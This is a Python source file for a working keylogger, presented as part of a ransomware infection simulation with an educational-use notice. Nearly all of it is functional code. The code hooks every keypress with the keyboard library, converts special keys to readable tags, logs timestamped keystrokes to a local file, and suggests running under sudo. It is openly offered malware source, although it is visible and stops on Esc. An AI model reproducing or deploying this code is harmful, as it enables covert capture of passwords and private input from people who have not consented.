#!/usr/bin/env python3
""" 
Keylogger Component
The ransomware infection mechanism simulation includes this keylogger.

NOTICE: Only in controlled settings for academic or educational purposes. 
"""


# Import required libraries
import os                               # Operating system interface
import sys                              # System-specific parameters and functions
import time                             # Time access and conversions
import logging                          # Logging facility for Python
from datetime import datetime          # Date and time manipulation
try:
    import keyboard                    # Cross-platform keyboard hook library
except ImportError:
    # Handle missing keyboard library dependency
    print("[-] keyboard module not found. Install with: pip install keyboard")
    sys.exit(1)

class SimpleKeylogger:
    """
    A simple keylogger class that captures keystrokes for educational purposes.
    This demonstrates how keyloggers can be used in infection mechanisms.
    """
    
    def __init__(self, log_file="keylog.txt"):
        """
        Initialize the keylogger with a log file.
        
        Args:
            log_file (str): Name of the file to log keystrokes to
        
        Returns:
            None
        """
        self.log_file = log_file
        self.setup_logging()
         
    def setup_logging(self):
        """
        Configure the logging system to record keystrokes.
        Sets up timestamp format and log level.
        
        Returns:
            None
        """
        # Configure logging to write to file with timestamps
        logging.basicConfig(
            filename=self.log_file,              # Log file name
            level=logging.INFO,                  # Log level (INFO and above)
            format='%(asctime)s - %(message)s',  # Log format with timestamp
            datefmt='%Y-%m-%d %H:%M:%S'          # Timestamp format
        )
         
    def callback(self, event):
        """
        Process keyboard events and log them appropriately.
        Handles special keys and converts them to readable format.
        
        Args:
            event: Keyboard event object from keyboard library
        
        Returns:
            None
        """
        # Only process key press events (ignore key release)
        if event.event_type == keyboard.KEY_DOWN:
            # Get the key name from the event
            key = event.name
             
            # Handle special keys with readable representations
            if key == 'space':
                key = ' '                         # Convert space to actual space
            elif key == 'enter':
                key = '[ENTER]\n'                 # Show enter key as newline
            elif key == 'backspace':
                key = '[BACKSPACE]'               # Show backspace key
            elif len(key) > 1:
                # Format other special keys (ctrl, alt, etc.)
                key = f'[{key.upper()}]'
                 
            # Log the processed key
            logging.info(key)
             
    def start(self):
        """
        Start the keylogger and begin capturing keystrokes.
        Provides user feedback and waits for ESC key to stop.
        
        Returns:
            None
        """
        print(f"[+] Keylogger started. Logging to {self.log_file}")
        print("[+] Press 'Esc' to stop logging")
         
        # Register the callback function for all key events
        keyboard.on_press(self.callback)
         
        # Wait for ESC key to stop logging (blocking operation)
        try:
            keyboard.wait('esc')
        except KeyboardInterrupt:
            # Handle Ctrl+C interruption
            pass
             
        # Inform user that logging has stopped
        print(f"[+] Keylogger stopped. Log saved to {self.log_file}")
         
    def get_log_content(self):
        """
        Read and return the content of the keylog file.
        
        Returns:
            str: Content of the keylog file or empty string if file not found
        """
        try:
            # Read the entire log file content
            with open(self.log_file, 'r') as f:
                return f.read()
        except FileNotFoundError:
            # Return empty string if log file doesn't exist
            return ""

def main():
    """
    Main function to create and run the keylogger.
    Demonstrates key capture and displays sample results.
    """
    # Create keylogger instance with specific log file name
    kl = SimpleKeylogger("infection_keylog.txt")
     
    # Start the keylogging process
    kl.start()
     
    # Show sample of captured keystrokes to user
    print("\n[+] Sample captured keystrokes:")
    content = kl.get_log_content()
    lines = content.split('\n')[-10:]  # Get last 10 lines
    for line in lines:
        if line.strip():  # Skip empty lines
            print(f"    {line}")

# Execute main function when script is run directly
if __name__ == "__main__":
    # Check if running with sufficient privileges (optional warning)
    if os.geteuid() != 0:
        print("[-] This keylogger may need root privileges on some systems")
        print("    Run with: sudo python3 keylogger.py")
     
    main()
